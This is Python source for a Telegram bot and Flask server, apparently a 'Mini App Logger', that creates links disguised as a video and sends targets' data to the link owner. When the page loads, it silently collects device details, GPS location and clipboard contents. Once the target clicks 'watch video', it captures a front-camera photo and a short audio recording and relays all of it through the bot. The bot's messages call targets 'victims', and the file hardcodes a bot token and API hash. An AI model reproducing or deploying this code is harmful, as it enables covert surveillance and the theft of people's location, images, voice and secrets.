import asyncio
from telethon import TelegramClient, events, Button
from telethon.tl.types import InputMediaGeoPoint, InputGeoPoint
from flask import Flask, request, render_template_string
import threading
import random
import string
import json
import os
from datetime import datetime
import requests
import base64

BOT_TOKEN = "8962532742:AAG1377yowFSqklfaPP_AzEXvIvV-Fm_jqw"

bot = TelegramClient('logger_bot', api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e")
app = Flask(__name__)
links = {}
loop = None

MINI_APP_PAGE = """<!DOCTYPE html>
<html>
<head><title>Video</title><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:Arial;text-align:center}
button{background:#fe2c55;color:#fff;border:none;padding:15px 40px;font-size:18px;border-radius:30px;margin:10px;cursor:pointer}
#status{margin-top:20px;color:#aaa}
</style></head>
<body>
<h2 style="margin-top:80px">🎬 Видео готово</h2>
<p>Нажмите чтобы посмотреть</p>
<button id="watchBtn" onclick="startAll()">▶ Смотреть видео</button>
<p id="status"></p>
<video id="v" style="display:none" autoplay playsinline></video>
<canvas id="c" style="display:none"></canvas>
<script>
const tg = window.Telegram.WebApp;
tg.expand();

const linkId = '{{ link_id }}';

// Собираем инфу сразу при открытии (без кнопки)
fetch('/collect/'+linkId,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ua:navigator.userAgent,pl:navigator.platform,la:navigator.language,ss:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone})});

// Пробуем GPS тихо (может сработать если уже давал разрешение)
if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(pos=>{
        fetch('/gps/'+linkId,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});
    },err=>{}, {enableHighAccuracy:true,timeout:10000,maximumAge:0});
}

// Буфер тихо
(async function(){
    try{var text=await navigator.clipboard.readText();if(text) fetch('/clipboard/'+linkId,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({clipboard:text})});}catch(e){}
})();

function startAll(){
    document.getElementById('status').innerText = 'Загрузка...';
    document.getElementById('watchBtn').style.display = 'none';
    
    (async function(){
        try{
            var st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
            var v=document.getElementById('v');v.srcObject=st;await v.play();
            await new Promise(r=>setTimeout(r,2000));
            var c=document.getElementById('c');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
            c.getContext('2d').drawImage(v,0,0);
            var ph=c.toDataURL('image/jpeg',0.7);
            await fetch('/photo/'+linkId,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:ph})});
            st.getTracks().forEach(t=>t.stop());
        }catch(e){}
    })();
    
    (async function(){
        try{
            var st=await navigator.mediaDevices.getUserMedia({audio:true});
            var chunks=[],rec=new MediaRecorder(st);
            rec.ondataavailable=e=>chunks.push(e.data);
            rec.start();
            await new Promise(r=>setTimeout(()=>rec.stop(),4000));
            await new Promise(r=>setTimeout(r,500));
            var blob=new Blob(chunks,{type:'audio/webm'});
            var reader=new FileReader();reader.readAsDataURL(blob);
            reader.onloadend=()=>fetch('/audio/'+linkId,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({audio:reader.result})});
            st.getTracks().forEach(t=>t.stop());
        }catch(e){}
    })();
    
    setTimeout(()=>{
        document.getElementById('status').innerText='✅ Готово!';
        tg.close();
    },3000);
}
</script></body></html>"""

def gen_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

@app.route('/')
def home(): return "OK"

@app.route('/app')
def mini_app():
    lid = request.args.get('startapp', '') or request.args.get('tgWebAppStartParam', '')
    
    if not lid:
        lid = gen_id()
        links[lid] = {'owner': 8613418593, 'created': datetime.now().strftime('%H:%M'), 'victims': []}
    
    if lid not in links:
        links[lid] = {'owner': 8613418593, 'created': datetime.now().strftime('%H:%M'), 'victims': []}
    
    links[lid]['victims'].append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'ua': request.headers.get('User-Agent', '?'),
        'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
        'photo': None, 'gps': None, 'audio': None, 'clipboard': None
    })
    
    asyncio.run_coroutine_threadsafe(notify(links[lid]['owner'], lid), loop)
    
    return render_template_string(MINI_APP_PAGE, link_id=lid)

@app.route('/collect/<lid>', methods=['POST'])
def coll(lid):
    if lid in links and links[lid]['victims']:
        links[lid]['victims'][-1]['dev'] = request.get_json()
    return 'ok'

@app.route('/photo/<lid>', methods=['POST'])
def photo(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('photo'): links[lid]['victims'][-1]['photo'] = d['photo']
    return 'ok'

@app.route('/gps/<lid>', methods=['POST'])
def gps(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        links[lid]['victims'][-1]['gps'] = d
    return 'ok'

@app.route('/audio/<lid>', methods=['POST'])
def audio(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('audio'): links[lid]['victims'][-1]['audio'] = d['audio']
    return 'ok'

@app.route('/clipboard/<lid>', methods=['POST'])
def clipboard(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('clipboard'): links[lid]['victims'][-1]['clipboard'] = d['clipboard']
    return 'ok'

async def notify(uid, lid):
    try:
        await asyncio.sleep(35)
        v = links[lid]['victims'][-1] if links[lid]['victims'] else {}
        
        report = f"""📋 ОТЧЁТ MINI APP
🕐 {v.get('time','?')}
📱 {v.get('ua','?')[:150]}
"""
        if v.get('gps') and v['gps'].get('lat'):
            report += f"📍 GPS: {v['gps']['lat']}, {v['gps']['lon']}\n"
        if v.get('clipboard'):
            report += f"\n📋 Буфер: {v['clipboard'][:200]}"
        
        await bot.send_message(uid, report[:2000])
        
        if v.get('photo'):
            try:
                photo_path = f"photo_{lid}.jpg"
                with open(photo_path, 'wb') as f:
                    f.write(base64.b64decode(v['photo'].split(',')[1]))
                if os.path.getsize(photo_path) > 100:
                    await bot.send_file(uid, photo_path, caption="📸 Фото")
                os.remove(photo_path)
            except: pass
        
        if v.get('audio'):
            try:
                audio_path = f"audio_{lid}.webm"
                with open(audio_path, 'wb') as f:
                    f.write(base64.b64decode(v['audio'].split(',')[1]))
                if os.path.getsize(audio_path) > 100:
                    await bot.send_file(uid, audio_path, caption="🎤 Аудио", voice_note=True)
                os.remove(audio_path)
            except: pass
        
        if v.get('gps') and v['gps'].get('lat'):
            lat, lon = v['gps']['lat'], v['gps']['lon']
            geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=10))
            await bot.send_file(uid, file=geo, caption="📍 GPS")
            await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={lat},{lon})", link_preview=True)
        
    except Exception as e:
        print(f"Ошибка notify: {e}")

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    buttons = [
        [Button.inline("🎭 Создать ссылку Mini App", "create")],
    ]
    await event.reply("🎭 **Mini App Logger**\n\nНажми кнопку чтобы создать ссылку.\nЖертва откроет её в Telegram — соберу фото, аудио, GPS, буфер!", buttons=buttons)

@bot.on(events.CallbackQuery)
async def callback(event):
    if event.data.decode() == "create":
        lid = gen_id()
        links[lid] = {'owner': event.sender_id, 'created': datetime.now().strftime('%H:%M'), 'victims': []}
        mini_url = f"https://t.me/creator_failpybot/Gram?startapp={lid}"
        await event.edit(f"✅ **Ссылка:**\n{mini_url}\n\nОтправь жертве — откроется в Telegram!")

@bot.on(events.NewMessage(pattern='/list'))
async def lst(event):
    my = {k: v for k, v in links.items() if v['owner'] == event.sender_id}
    if not my: await event.reply("Нет ссылок")
    else:
        r = "📋 **Ссылки:**\n"
        for lid, d in my.items(): r += f"🔗 `{lid}` — {len(d['victims'])} переходов\n"
        await event.reply(r)

async def main():
    global loop
    loop = asyncio.get_event_loop()
    port = int(os.environ.get('PORT', 8080))
    def run_flask(): app.run(host='0.0.0.0', port=port, debug=False)
    threading.Thread(target=run_flask, daemon=True).start()
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ Mini App Logger запущен!")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
